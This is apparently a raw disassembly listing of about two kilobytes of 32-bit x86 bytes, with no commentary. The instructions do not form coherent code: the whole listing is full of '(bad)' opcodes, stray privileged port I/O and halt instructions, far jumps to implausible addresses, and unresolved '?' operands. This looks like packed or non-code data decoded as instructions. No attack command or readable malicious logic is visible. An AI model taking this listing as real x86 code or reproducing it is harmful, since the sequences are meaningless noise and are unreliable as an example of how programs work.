  41a3ee:	fdivr  QWORD PTR [esp+edx*1-0x2e]
  41a3f2:	(bad)  
  41a3f3:	or     DWORD PTR [edi-0x49e5e937],edi
  41a3f9:	sahf   
  41a3fa:	jmp    0xacab64b9
  41a3ff:	aas    
  41a400:	or     al,BYTE PTR [ecx]
  41a402:	mov    dl,0x98
  41a404:	xchg   ecx,eax
  41a405:	rol    BYTE PTR [esi+0x35],cl
  41a408:	sub    ah,ch
  41a40a:	fst    DWORD PTR [edx+0x76513cc3]
  41a410:	repnz push 0xffffffb8
  41a413:	push   edx
  41a414:	adc    ebx,eax
  41a416:	(bad)  
  41a417:	stc    
  41a418:	out    dx,al
  41a419:	jbe    0x41a3f0
  41a41b:	arpl   WORD PTR [edi-0x7c3062f0],si
  41a421:	nop
  41a422:	ins    DWORD PTR es:[edi],dx
  41a423:	imul   esp,DWORD PTR [eax+0x4],0x17
  41a427:	test   BYTE PTR [edx+0x6f72b050],bh
  41a42d:	sub    dh,BYTE PTR [ebp+0x5099249]
  41a433:	lock jae 0x41a3df
  41a436:	xor    al,0x94
  41a438:	mov    ebx,0xe5090e9
  41a43d:	fdivr  DWORD PTR [edi]
  41a43f:	adc    cl,BYTE PTR [ebx]
  41a441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a442:	mov    BYTE PTR [ebx],dh
  41a444:	pusha  
  41a445:	pop    edx
  41a446:	not    DWORD PTR [edx+0x1e]
  41a449:	cli    
  41a44a:	add    al,0x44
  41a44c:	retf   0x8582
  41a44f:	push   ebp
  41a450:	pop    ebx
  41a451:	mov    eax,0x2adfae6c
  41a456:	rcl    DWORD PTR [edx],cl
  41a458:	ja     0x41a496
  41a45a:	(bad)  
  41a45b:	ja     0x41a413
  41a45d:	mov    al,0x74
  41a45f:	jne    0x41a41d
  41a461:	in     eax,dx
  41a462:	or     al,0x9f
  41a464:	and    ah,BYTE PTR gs:[ecx+ecx*1]
  41a468:	adc    eax,DWORD PTR [esi+0x31]
  41a46b:	rcr    DWORD PTR [edi+ebp*4-0xa9230ad],1
  41a472:	test   DWORD PTR [edi-0x39],edx
  41a475:	adc    esp,DWORD PTR ds:0x3ce9faa1
  41a47b:	xor    DWORD PTR [ebp-0x52],ecx
  41a47e:	int    0x26
  41a480:	scas   al,BYTE PTR es:[edi]
  41a481:	pop    ds
  41a482:	ss cs xchg edx,eax
  41a485:	jl     0x41a490
  41a487:	pushf  
  41a488:	sbb    edi,DWORD PTR [edi-0x79]
  41a48b:	and    DWORD PTR [edi-0x5a278bcf],edx
  41a491:	mov    ds:0x1836fe45,al
  41a496:	or     al,0x21
  41a498:	(bad)  
  41a499:	cmp    eax,0x182a5481
  41a49e:	mov    eax,ds:0xeb8fea78
  41a4a3:	xchg   DWORD PTR [edx+0x78],eax
  41a4a6:	xchg   edx,eax
  41a4a7:	stc    
  41a4a8:	jecxz  0x41a4be
  41a4aa:	dec    edi
  41a4ab:	dec    eax
  41a4ac:	outs   dx,BYTE PTR ds:[esi]
  41a4ad:	mov    bl,0x45
  41a4af:	rcl    BYTE PTR [eax],1
  41a4b1:	mov    bl,0xba
  41a4b3:	xchg   esp,eax
  41a4b4:	jb     0x41a4f1
  41a4b6:	and    DWORD PTR [eax+0x4592f84a],edx
  41a4bc:	cmc    
  41a4bd:	mov    bl,BYTE PTR [eax]
  41a4bf:	fidivr WORD PTR [ecx]
  41a4c1:	xor    DWORD PTR [edi-0x80397cd],ebx
  41a4c7:	cli    
  41a4c8:	retf   0x8c58
  41a4cb:	pop    edi
  41a4cc:	dec    DWORD PTR [ebx-0xfe372a7]
  41a4d2:	dec    edx
  41a4d3:	stos   BYTE PTR es:[edi],al
  41a4d4:	dec    esp
  41a4d5:	sub    BYTE PTR [ebx-0x7f17a026],0x81
  41a4dc:	xor    al,0x8f
  41a4de:	add    eax,0x26aecce4
  41a4e3:	mov    ah,0xcc
  41a4e5:	daa    
  41a4e6:	cld    
  41a4e7:	repz mov dl,0xe6
  41a4ea:	(bad)  
  41a4eb:	out    0x8d,eax
  41a4ed:	add    eax,0x958d1701
  41a4f2:	(bad)  
  41a4f3:	out    dx,al
  41a4f4:	push   ebp
  41a4f5:	mov    eax,ds:0x6b22e06c
  41a4fa:	aam    0x10
  41a4fc:	pop    edx
  41a4fd:	xchg   esp,eax
  41a4fe:	jg     0x41a4c3
  41a500:	ficom  WORD PTR [edi+0x2c]
  41a503:	push   esp
  41a504:	mov    DWORD PTR [ecx-0x9],edx
  41a507:	dec    ebx
  41a508:	push   esp
  41a509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a50a:	cs icebp 
  41a50c:	sti    
  41a50d:	rol    DWORD PTR [ebp+0x63056072],1
  41a513:	outs   dx,DWORD PTR ds:[esi]
  41a514:	cmp    BYTE PTR ds:0xf1ca7642,0xc2
  41a51b:	int    0x8a
  41a51d:	xchg   ebp,eax
  41a51e:	(bad)  
  41a51f:	shl    DWORD PTR [eax+0x28],cl
  41a522:	and    ch,bl
  41a524:	test   al,0x49
  41a526:	dec    eax
  41a527:	je     0x41a4aa
  41a529:	pop    ebp
  41a52a:	xchg   BYTE PTR [eax],dl
  41a52c:	stos   BYTE PTR es:[edi],al
  41a52d:	les    esi,FWORD PTR [eax]
  41a52f:	mov    esp,0x6d50e7c3
  41a534:	xchg   ecx,eax
  41a535:	mov    ecx,0xcc4956e3
  41a53a:	sub    eax,DWORD PTR [ecx-0x710d607]
  41a540:	jge    0x41a4cc
  41a542:	sbb    BYTE PTR [ecx+0x78540ea4],0x3a
  41a549:	adc    BYTE PTR [ecx+0x41],0x79
  41a54d:	pop    ds
  41a54e:	mov    edi,0x4d591206
  41a553:	(bad)  
  41a554:	mov    cl,0x46
  41a556:	adc    eax,0x38de4516
  41a55b:	pop    es
  41a55c:	hlt    
  41a55d:	sbb    al,0x99
  41a55f:	add    DWORD PTR [edx],edx
  41a561:	ja     0x41a509
  41a563:	push   0x27
  41a565:	test   ah,0xf
  41a568:	push   ebp
  41a569:	(bad)  
  41a56a:	xchg   esp,eax
  41a56b:	in     al,0x45
  41a56d:	add    eax,esp
  41a56f:	jb     0x41a5de
  41a571:	ins    BYTE PTR es:[edi],dx
  41a572:	jne    0x41a5eb
  41a574:	bnd jnp 0x41a5d6
  41a577:	dec    ebx
  41a578:	lods   eax,DWORD PTR ds:[esi]
  41a579:	ins    BYTE PTR es:[edi],dx
  41a57a:	pop    es
  41a57b:	jnp    0x41a558
  41a57d:	cmp    WORD PTR [eax],0x76
  41a581:	xor    DWORD PTR [eax+0xcf54734],eax
  41a587:	in     al,dx
  41a588:	mov    al,0xd5
  41a58a:	rcr    DWORD PTR [ebx-0x5d],1
  41a58d:	xor    bh,dl
  41a58f:	popa   
  41a590:	xchg   esi,eax
  41a591:	adc    al,0x2e
  41a593:	inc    edi
  41a594:	pop    edi
  41a595:	adc    eax,0xdf1bb87e
  41a59a:	mov    edi,0x51fdf701
  41a59f:	mov    cl,0xc5
  41a5a1:	daa    
  41a5a2:	fnstsw WORD PTR [eax-0x1d]
  41a5a5:	or     al,0xd5
  41a5a7:	fimul  WORD PTR [ecx+0x69]
  41a5aa:	fdiv   DWORD PTR [eax]
  41a5ac:	xor    bh,BYTE PTR [edx+0x65]
  41a5af:	call   0xf1c15309
  41a5b4:	das    
  41a5b5:	mov    al,0x80
  41a5b7:	cmp    al,0x7c
  41a5b9:	nop
  41a5ba:	fistp  QWORD PTR ds:0xb32674a9
  41a5c0:	mov    ds:0x94abb858,eax
  41a5c5:	adc    eax,0x1852ac5a
  41a5ca:	jmp    0xf8123a1c
  41a5cf:	and    dl,BYTE PTR [ebx+eax*1+0x6d]
  41a5d3:	mov    dh,0x47
  41a5d5:	retf   
  41a5d6:	inc    edi
  41a5d7:	add    bl,bh
  41a5d9:	sbb    DWORD PTR [ebp-0x4073376c],0x1c
  41a5e0:	out    0x99,al
  41a5e2:	push   esp
  41a5e3:	(bad)  
  41a5e4:	mov    ch,0x55
  41a5e6:	jl     0x41a572
  41a5e8:	inc    edi
  41a5e9:	retfw  0x4181
  41a5ed:	pushf  
  41a5ee:	pop    esp
  41a5ef:	stc    
  41a5f0:	int    0x18
  41a5f2:	sbb    dh,BYTE PTR [edi+0x1]
  41a5f5:	in     eax,dx
  41a5f6:	stos   BYTE PTR es:[edi],al
  41a5f7:	inc    ecx
  41a5f8:	test   DWORD PTR [ecx],esi
  41a5fa:	xlat   BYTE PTR ds:[ebx]
  41a5fb:	dec    ecx
  41a5fc:	fldcw  WORD PTR [ecx+0x3793e837]
  41a602:	aaa    
  41a603:	stos   BYTE PTR es:[edi],al
  41a604:	aaa    
  41a605:	stos   BYTE PTR es:[edi],al
  41a606:	or     eax,esi
  41a608:	dec    eax
  41a609:	test   al,0x2f
  41a60b:	lock push ecx
  41a60d:	sbb    esi,DWORD PTR [ebp-0x7c6cb228]
  41a613:	jno    0x41a603
  41a615:	inc    edi
  41a616:	cmp    edi,edx
  41a618:	mov    ds:0x83ef917b,eax
  41a61e:	jecxz  0x41a5e7
  41a620:	icebp  
  41a621:	mov    dl,0x57
  41a623:	stos   DWORD PTR es:[edi],eax
  41a624:	pop    ecx
  41a625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a626:	das    
  41a627:	lahf   
  41a628:	les    esp,FWORD PTR [edx]
  41a62a:	jmp    0x41a625
  41a62c:	outs   dx,BYTE PTR ds:[esi]
  41a62d:	xor    DWORD PTR [ecx],0x6c
  41a630:	or     esi,DWORD PTR ss:[ecx]
  41a633:	es xor eax,0x178a794d
  41a639:	cmp    BYTE PTR [ecx-0x68891324],cl
  41a63f:	sub    edi,edx
  41a641:	sub    eax,0xa697e4cd
  41a646:	cmc    
  41a647:	(bad)
  41a64b:	pop    ecx
  41a64c:	in     al,dx
  41a64d:	push   esi
  41a64e:	push   esi
  41a64f:	mov    esp,0xa8dcafdb
  41a654:	popf   
  41a655:	push   0xf
  41a657:	out    0x42,al
  41a659:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41a65b:	jle    0x41a655
  41a65d:	ins    DWORD PTR es:[edi],dx
  41a65e:	gs call 0x19923b64
  41a664:	repnz sti 
  41a666:	xchg   edi,eax
  41a667:	out    dx,eax
  41a668:	iret   
  41a669:	mov    ?,ebp
  41a66b:	jl     0x41a603
  41a66d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a66e:	push   ss
  41a66f:	ja     0x41a6db
  41a671:	retf   
  41a672:	rcl    DWORD PTR [edi-0x2e2dcdfe],1
  41a678:	sti    
  41a679:	xchg   DWORD PTR [esi],esi
  41a67b:	sar    BYTE PTR [eax],1
  41a67d:	jnp    0x41a6cb
  41a67f:	sub    eax,0x82755212
  41a684:	xchg   edx,eax
  41a685:	retf   
  41a686:	mov    ?,ebx
  41a688:	idiv   BYTE PTR [edi+0x14]
  41a68b:	jmp    0x8591:0xfe3f8b68
  41a692:	lock sbb eax,0xec490588
  41a698:	pop    ebx
  41a699:	hlt    
  41a69a:	sbb    al,0x5d
  41a69c:	mov    edi,DWORD PTR [ebx+0x7b0dfb81]
  41a6a2:	add    ecx,esp
  41a6a4:	repz cmp DWORD PTR [ecx+0x1d],ebp
  41a6a8:	xchg   DWORD PTR [edi],esp
  41a6aa:	dec    ebp
  41a6ab:	out    0xc7,al
  41a6ad:	xor    DWORD PTR [ebx+0x73208c06],ecx
  41a6b3:	fstp   QWORD PTR [ebp-0x20]
  41a6b6:	mov    dl,0xfe
  41a6b8:	sub    ch,BYTE PTR [ecx+0x25]
  41a6bb:	retf   0x4fcc
  41a6be:	scas   eax,DWORD PTR es:[edi]
  41a6bf:	sub    al,0x9b
  41a6c1:	sbb    ah,BYTE PTR [ecx-0x20]
  41a6c4:	inc    eax
  41a6c5:	cmp    dl,ch
  41a6c7:	add    al,dh
  41a6c9:	inc    ebx
  41a6ca:	repz iret 
  41a6cc:	loop   0x41a73b
  41a6ce:	mov    al,0x87
  41a6d0:	jmp    0x3d99:0x4bd2b5c
  41a6d7:	fsubrp st(6),st
  41a6d9:	lds    ebp,FWORD PTR [ebx+0x7a60578e]
  41a6df:	sahf   
  41a6e0:	ret    0xd084
  41a6e3:	jne    0x41a71c
  41a6e5:	inc    ebp
  41a6e6:	adc    ebp,DWORD PTR [edi+0x3255d66e]
  41a6ec:	daa    
  41a6ed:	adc    eax,0x4aeee37
  41a6f2:	in     al,dx
  41a6f3:	lods   eax,DWORD PTR ds:[esi]
  41a6f4:	sbb    ebp,DWORD PTR [ecx+0x71]
  41a6f7:	jp     0x41a6d0
  41a6f9:	(bad)  
  41a6fb:	div    BYTE PTR [edx+0x22]
  41a6fe:	outs   dx,BYTE PTR ds:[esi]
  41a6ff:	jp     0x41a755
  41a701:	inc    ebp
  41a702:	pop    eax
  41a703:	jecxz  0x41a73f
  41a705:	ret    0x3e08
  41a708:	mov    eax,0x3b9c52c4
  41a70d:	or     al,0x39
  41a70f:	sbb    BYTE PTR [ebx+0x25],ch
  41a712:	inc    edi
  41a713:	sub    cl,BYTE PTR [eax-0x2d221a7a]
  41a719:	neg    eax
  41a71b:	cs (bad) 
  41a71d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a71e:	mov    ecx,0xc1179cf7
  41a723:	sub    eax,0x85035750
  41a728:	xchg   DWORD PTR [edx-0x40],ebx
  41a72b:	adc    BYTE PTR gs:[edx+0x2cc7208e],al
  41a732:	aam    0xb4
  41a734:	les    ebx,FWORD PTR [edx]
  41a736:	sbb    DWORD PTR [edi+0x62],0x6d
  41a73a:	(bad)  
  41a73b:	mov    ?,WORD PTR [esi]
  41a73d:	add    cl,BYTE PTR [esi]
  41a73f:	jne    0x41a7a6
  41a741:	lea    ebp,[eax+0x743fd38c]
  41a747:	call   0xce0:0x62f33620
  41a74e:	stos   DWORD PTR es:[edi],eax
  41a74f:	xchg   edx,eax
  41a750:	clc    
  41a751:	dec    edx
  41a752:	sbb    BYTE PTR [ebp+0x14],bh
  41a755:	icebp  
  41a756:	cwde   
  41a757:	popa   
  41a758:	or     al,0x2d
  41a75a:	retf   
  41a75b:	outs   dx,DWORD PTR ds:[esi]
  41a75c:	mov    DWORD PTR [eax],ebp
  41a75e:	cwde   
  41a75f:	outs   dx,BYTE PTR ds:[esi]
  41a760:	in     eax,0xad
  41a762:	push   edi
  41a763:	or     bl,BYTE PTR [ecx+edx*1-0x41]
  41a767:	sub    ebx,ecx
  41a769:	or     DWORD PTR [esi-0x78],edi
  41a76c:	sbb    eax,0x8ed0a192
  41a771:	sbb    BYTE PTR [eax+0x18],cl
  41a774:	retf   
  41a775:	fbstp  TBYTE PTR [edi+0x3cc4d242]
  41a77b:	add    bl,BYTE PTR [edx+esi*4+0x43]
  41a77f:	jl     0x41a7bb
  41a781:	aad    0x4b
  41a783:	arpl   cx,ax
  41a785:	stos   BYTE PTR es:[edi],al
  41a786:	and    DWORD PTR [eax-0x6],edi
  41a789:	mov    al,0xf7
  41a78b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a78c:	inc    eax
  41a78d:	icebp  
  41a78e:	(bad)  
  41a790:	push   edx
  41a791:	mov    WORD PTR [eax+0x4cee2c07],ss
  41a797:	mov    al,0x74
  41a799:	jmp    0x41a802
  41a79b:	pop    es
  41a79c:	aam    0x46
  41a79e:	inc    ebx
  41a79f:	fsubr  DWORD PTR [ebp-0x4c]
  41a7a2:	stos   BYTE PTR es:[edi],al
  41a7a3:	mov    esp,DWORD PTR [edx]
  41a7a5:	sbb    edx,eax
  41a7a7:	in     eax,0xd
  41a7a9:	sbb    esi,DWORD PTR [esp+ebp*1]
  41a7ac:	in     eax,dx
  41a7ad:	sbb    eax,0x2a051460
  41a7b2:	les    eax,FWORD PTR [eax]
  41a7b4:	jo     0x41a814
  41a7b6:	xchg   edx,eax
  41a7b7:	hlt    
  41a7b8:	hlt    
  41a7b9:	push   eax
  41a7ba:	loope  0x41a795
  41a7bc:	jo     0x41a77e
  41a7be:	mov    esp,0x412e1296
  41a7c3:	sub    dh,BYTE PTR [ebx-0x7cb4c111]
  41a7c9:	in     al,dx
  41a7ca:	(bad)  
  41a7cb:	jne    0x41a76b
  41a7cd:	jp     0x41a807
  41a7cf:	xor    dh,al
  41a7d1:	cmc    
  41a7d2:	or     bl,ch
  41a7d4:	mov    ebp,?
  41a7d6:	pop    ds
  41a7d7:	test   DWORD PTR [eax+0x7bc6a781],esi
  41a7dd:	or     BYTE PTR [ecx+0x738ad8d],0x4d
  41a7e4:	jecxz  0x41a845
  41a7e6:	loope  0x41a81a
  41a7e8:	adc    DWORD PTR [ebx-0x121ca2f2],esi
  41a7ee:	sbb    eax,0x58962330
  41a7f3:	sub    dh,0xfe
  41a7f6:	mul    ebp
  41a7f8:	addr16 pop eax
  41a7fa:	gs pop ss
  41a7fc:	outs   dx,DWORD PTR ds:[esi]
  41a7fd:	aam    0xc4
  41a7ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a800:	shl    bh,0xc5
  41a803:	jge    0x41a7de
  41a805:	inc    ebx
  41a806:	dec    esp
  41a807:	dec    ebp
  41a808:	imul   edi,edx,0xba48bfc4
  41a80e:	imul   DWORD PTR [edx+edx*4-0x37]
  41a812:	aad    0x15
  41a814:	xchg   ecx,eax
  41a815:	cmp    DWORD PTR [edx-0x3a],esi
  41a818:	loope  0x41a7a2
  41a81a:	inc    ebp
  41a81b:	lods   al,BYTE PTR ds:[esi]
  41a81c:	add    cl,BYTE PTR [edx]
  41a81e:	mov    bh,0x23
  41a820:	pop    es
  41a821:	cmp    esp,DWORD PTR [eax+0x5e]
  41a824:	test   al,0xce
  41a826:	aad    0x81
  41a828:	iret   
  41a829:	mov    eax,ds:0xddd1472a
  41a82e:	mov    bh,0x4e
  41a830:	stos   DWORD PTR es:[edi],eax
  41a831:	repnz dec ecx
  41a833:	xor    BYTE PTR ds:0x1ce72c75,cl
  41a839:	pop    esi
  41a83a:	sti    
  41a83b:	dec    ecx
  41a83c:	mov    ecx,0xc9abe1b
  41a841:	lock stos BYTE PTR es:[edi],al
  41a843:	dec    esp
  41a844:	rcr    esi,cl
  41a846:	and    DWORD PTR [esi],ebx
  41a848:	xchg   edi,eax
  41a849:	jmp    0xf24e:0xcdae6512
  41a850:	adc    eax,0xd5a90dc1
  41a855:	mov    DWORD PTR [ecx],edx
  41a857:	rcr    BYTE PTR [edx],cl
  41a859:	adc    DWORD PTR [ebx+ecx*2+0x1e],esi
  41a85d:	pusha  
  41a85e:	mov    ebx,0xf9a98a7b
  41a863:	push   ds
  41a864:	jecxz  0x41a8b5
  41a866:	pop    esp
  41a867:	nop
  41a868:	out    dx,eax
  41a869:	push   eax
  41a86a:	pop    ss
  41a86b:	lea    esp,[ebx+0x7a1691f1]
  41a871:	jmp    0xa9e436df
  41a876:	jo     0x41a84d
  41a878:	rcr    BYTE PTR [edx-0x4b],1
  41a87b:	jmp    0x8c2c:0x6e7a3c13
  41a882:	xor    dh,BYTE PTR [ebx+0xafae03]
  41a888:	jne    0x41a866
  41a88a:	mov    esp,ebp
  41a88c:	push   ebx
  41a88d:	mov    edx,0x4a1e1f21
  41a892:	dec    edx
  41a893:	(bad)  [ecx]
  41a895:	xchg   edi,eax
  41a896:	fidivr WORD PTR [ecx]
  41a898:	mov    ecx,0x2d9798f7
  41a89d:	shr    DWORD PTR [ecx+0x1f386aaa],cl
  41a8a3:	test   BYTE PTR [esi],0x3f
  41a8a6:	cmp    BYTE PTR [ecx+0x44c941e4],0x22
  41a8ad:	inc    ecx
  41a8ae:	xchg   ebp,eax
  41a8af:	jb     0x41a8f0
  41a8b1:	fcmovnu st,st(1)
  41a8b3:	inc    ebp
  41a8b4:	sub    al,0x3c
  41a8b6:	jne    0x41a8a1
  41a8b8:	outs   dx,DWORD PTR ds:[esi]
  41a8b9:	and    eax,DWORD PTR [edi-0x5fd501e0]
  41a8bf:	test   DWORD PTR [edi],eax
  41a8c1:	sbb    al,0x1f
  41a8c3:	lahf   
  41a8c4:	cwde   
  41a8c5:	hlt    
  41a8c6:	fcom   QWORD PTR [edx]
  41a8c8:	sub    BYTE PTR [edx],ch
  41a8ca:	jno    0x41a92a
  41a8cc:	in     al,0x39
  41a8ce:	pop    ebp
  41a8cf:	mov    BYTE PTR [edx+0x46],ch
  41a8d2:	lahf   
  41a8d3:	loopne 0x41a925
  41a8d5:	(bad)  [ecx-0x63f0bfbc]
  41a8db:	inc    edx
  41a8dc:	ret    0x9034
  41a8df:	xchg   edx,eax
  41a8e0:	fs scas al,BYTE PTR es:[edi]
  41a8e2:	dec    ebp
  41a8e3:	jle    0x41a8f8
  41a8e5:	xchg   esp,eax
  41a8e6:	fcomi  st,st(4)
  41a8e8:	outs   dx,BYTE PTR ds:[esi]
  41a8e9:	cld    
  41a8ea:	mov    ebx,0x40e2bf05
  41a8ef:	inc    ebp
  41a8f0:	inc    edi
  41a8f1:	icebp  
  41a8f2:	push   ebx
  41a8f3:	stc    
  41a8f4:	dec    ebp
  41a8f5:	pop    edx
  41a8f6:	imul   esp,DWORD PTR [ebx-0x3ad355d8],0x587cdb68
  41a900:	xchg   ecx,eax
  41a901:	int    0x9d
  41a903:	fnsave ds:0x24c8257
  41a909:	pop    ebp
  41a90a:	call   0x413c853d
  41a90f:	call   0xfd4908d1
  41a914:	int3   
  41a915:	sbb    DWORD PTR [ebx-0x16199949],esi
  41a91b:	and    al,0x8a
  41a91d:	push   ds
  41a91e:	sar    esp,0x94
  41a921:	xchg   edx,eax
  41a922:	jne    0x41a950
  41a924:	ins    DWORD PTR es:[edi],dx
  41a925:	out    0xd2,eax
  41a927:	jge    0x41a933
  41a929:	(bad)  
  41a92b:	mov    edx,DWORD PTR [ecx-0x51]
  41a92e:	jns    0x41a8df
  41a930:	repz or al,0x2
  41a933:	and    eax,0x71a9092a
  41a938:	sbb    al,0x6d
  41a93a:	add    bh,bl
  41a93c:	enter  0x267d,0x44
  41a940:	pop    ds
  41a941:	or     DWORD PTR [edi],0x896783cc
  41a947:	jo     0x41a932
  41a949:	sub    bh,BYTE PTR [ebx+0x273c9bdb]
  41a94f:	and    al,0xfb
  41a951:	xchg   ecx,eax
  41a952:	out    dx,al
  41a953:	jge    0x41a963
  41a955:	pushf  
  41a956:	xor    al,0xc0
  41a958:	iret   
  41a959:	jg     0x41a8eb
  41a95b:	gs and cl,bh
  41a95e:	sbb    eax,0x386d7985
  41a963:	push   eax
  41a964:	stos   BYTE PTR es:[edi],al
  41a965:	out    0x1e,eax
  41a967:	mov    dh,0xf4
  41a969:	push   ss
  41a96a:	jae    0x41a9e6
  41a96c:	test   DWORD PTR [ebx-0x43030ca3],esp
  41a972:	inc    eax
  41a973:	outs   dx,BYTE PTR ds:[esi]
  41a974:	inc    eax
  41a975:	aad    0xbb
  41a977:	jg     0x41a9e6
  41a979:	mov    ecx,0xfc4eddcc
  41a97e:	jp     0x41a994
  41a980:	add    al,0xc5
  41a982:	jp     0x41a96c
  41a984:	stc    
  41a985:	adc    DWORD PTR [eax+0x19e47ed4],ebx
  41a98b:	out    0xff,eax
  41a98d:	mov    ebx,0xbdc1a65a
  41a992:	push   0x85509226
  41a997:	mov    cl,0x6c
  41a999:	push   eax
  41a99a:	adc    DWORD PTR [ebp+0xb],ebp
  41a99d:	add    ecx,DWORD PTR [edi+0x7472fea0]
  41a9a3:	pop    ds
  41a9a4:	inc    ebx
  41a9a5:	sbb    al,0x4a
  41a9a7:	pop    ss
  41a9a8:	loop   0x41aa19
  41a9aa:	(bad)  
  41a9ab:	jmp    0x3a71:0x6353a007
  41a9b2:	scas   eax,DWORD PTR es:[edi]
  41a9b3:	push   0xffffffa4
  41a9b5:	inc    edi
  41a9b6:	xchg   bl,cl
  41a9b8:	loope  0x41a9f9
  41a9ba:	mov    ch,0x41
  41a9bc:	or     cl,BYTE PTR [edi]
  41a9be:	out    dx,al
  41a9bf:	lea    ecx,[edx+0x23b26e5b]
  41a9c5:	inc    ebp
  41a9c6:	ror    BYTE PTR [esi+ebp*1+0x61],0x32
  41a9cb:	or     eax,0x117b3828
  41a9d0:	sbb    edi,ebp
  41a9d2:	jnp    0x41aa2f
  41a9d4:	mov    dl,BYTE PTR ds:0xe619a79d
  41a9da:	mov    al,ds:0x3651e1a4
  41a9df:	add    BYTE PTR [edx],dh
  41a9e1:	les    edi,FWORD PTR [edx+edx*8]
  41a9e4:	adc    eax,0xbb1679dc
  41a9e9:	cld    
  41a9ea:	fdivr  DWORD PTR [esi-0x52aec54c]
  41a9f0:	and    DWORD PTR [edi-0x67bbc75c],esp
  41a9f6:	cmp    al,0xfb
  41a9f8:	icebp  
  41a9f9:	xchg   edx,eax
  41a9fa:	push   edx
  41a9fb:	mov    WORD PTR [eax],?
  41a9fd:	ss pop ss
  41a9ff:	mov    esp,0x88a1e028
  41aa04:	jbe    0x41a98b
  41aa06:	cdq    
  41aa07:	nop
  41aa08:	js     0x41aa2a
  41aa0a:	leave  
  41aa0b:	jmp    0x15a1:0xc4da7ede
  41aa12:	mov    edi,0xf32b41aa
  41aa17:	loop   0x41aa93
  41aa19:	mov    esp,0xda2f1f7
  41aa1e:	xchg   edi,eax
  41aa1f:	jge    0x41aa0a
  41aa21:	fldcw  WORD PTR [ebp+ecx*1+0x3]
  41aa25:	push   ebx
  41aa26:	pop    ecx
  41aa27:	push   eax
  41aa28:	sar    DWORD PTR [ebx-0xc],0xc8
  41aa2c:	loop   0x41aa1e
  41aa2e:	es ins BYTE PTR es:[edi],dx
  41aa30:	rcr    BYTE PTR [edx-0x2e],0x7b
  41aa34:	push   ds
  41aa35:	push   ebx
  41aa36:	xor    DWORD PTR [ebx],0x6
  41aa39:	sbb    DWORD PTR [edx],ecx
  41aa3b:	scas   eax,DWORD PTR es:[edi]
  41aa3c:	pop    ebp
  41aa3d:	adc    eax,0x8ffcab1c
  41aa42:	rol    DWORD PTR [edx],1
  41aa44:	test   DWORD PTR fs:[ecx],eax
  41aa47:	sub    edi,DWORD PTR [esi+0x7d]
  41aa4a:	push   edx
  41aa4b:	(bad)  
  41aa4c:	and    al,0x20
  41aa4e:	jmp    0xd9e1:0xe5460a32
  41aa55:	sub    eax,0x5d8eb121
  41aa5a:	xchg   ecx,eax
  41aa5b:	sbb    ah,bl
  41aa5d:	fimul  WORD PTR [ecx]
  41aa5f:	out    0xf7,eax
  41aa61:	sbb    dh,bl
  41aa63:	dec    ebx
  41aa64:	enter  0xd890,0xa4
  41aa68:	xlat   BYTE PTR ds:[ebx]
  41aa69:	cs sbb al,0x47
  41aa6c:	bound  esp,QWORD PTR [edi+0x13346507]
  41aa72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa73:	sti    
  41aa74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa75:	xor    edi,DWORD PTR [edx]
  41aa77:	inc    esi
  41aa78:	xchg   ebp,eax
  41aa79:	inc    edi
  41aa7a:	mov    esi,DWORD PTR [esi-0x4de4f03a]
  41aa80:	jo     0x41aaca
  41aa82:	jge    0x41aa87
  41aa84:	cli    
  41aa85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa86:	mov    ebp,0x87bc1a32
  41aa8b:	into   
  41aa8c:	fnstsw WORD PTR [esi]
  41aa8e:	dec    ebp
  41aa8f:	mov    ebx,0xbf0e10be
  41aa94:	bound  ecx,QWORD PTR [ecx]
  41aa96:	pop    eax
  41aa97:	idiv   al
  41aa99:	fidiv  DWORD PTR [eax]
  41aa9b:	in     eax,0x27
  41aa9d:	mov    eax,0x426b716c
  41aaa2:	repz and BYTE PTR [edi+0xe],bl
  41aaa6:	out    0x96,eax
  41aaa8:	adc    DWORD PTR [ebx+ecx*4+0x27e753cd],0xffffff8d
  41aab0:	xor    DWORD PTR [edx+0x2f],esi
  41aab3:	imul   ebp,ebp,0xa985aecf
  41aab9:	cs push cs
  41aabb:	ins    BYTE PTR es:[edi],dx
  41aabc:	stos   BYTE PTR es:[edi],al
  41aabd:	or     BYTE PTR [ebx],bl
  41aabf:	inc    ecx
  41aac0:	jns    0x41aa7b
  41aac2:	fidiv  DWORD PTR ds:0x78dd9be2
  41aac8:	adc    al,0x52
  41aaca:	test   DWORD PTR [ebp+0x47cc3042],esp
  41aad0:	sub    BYTE PTR [ebx],ah
  41aad2:	pop    ds
  41aad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aad4:	adc    eax,0xc1355677
  41aad9:	xor    esp,DWORD PTR [edx-0x21]
  41aadc:	pop    es
  41aadd:	int    0x37
  41aadf:	and    al,0x2e
  41aae1:	cmp    bl,bl
  41aae3:	add    al,0x50
  41aae5:	mov    ah,0xea
  41aae7:	xor    dl,BYTE PTR [edi-0x74]
  41aaea:	mov    eax,ds:0xa833a33b
  41aaef:	jge    0x41ab6e
  41aaf1:	ret    
  41aaf2:	cmp    eax,esi
  41aaf4:	mov    ds:0x7492e3f0,al
  41aaf9:	stos   DWORD PTR es:[di],eax
  41aafb:	xchg   esi,eax
  41aafc:	pop    es
  41aafd:	pop    edx
  41aafe:	jmp    0x41ab57
  41ab00:	dec    eax
  41ab01:	add    DWORD PTR [edx-0x3b6cb890],ebp
  41ab07:	add    bl,BYTE PTR [ecx+0x3eb30137]
  41ab0d:	stos   DWORD PTR es:[edi],eax
  41ab0e:	mov    edi,DWORD PTR [ebp-0x5d]
  41ab11:	and    ebx,DWORD PTR [ebp+0x19e600d6]
  41ab17:	xchg   DWORD PTR [esi+0x68],eax
  41ab1a:	mov    ebp,0x7e9223e2
  41ab1f:	push   ebp
  41ab20:	jne    0x41ab81
  41ab22:	ror    DWORD PTR [edx-0x7d],cl
  41ab25:	pop    esi
  41ab26:	daa    
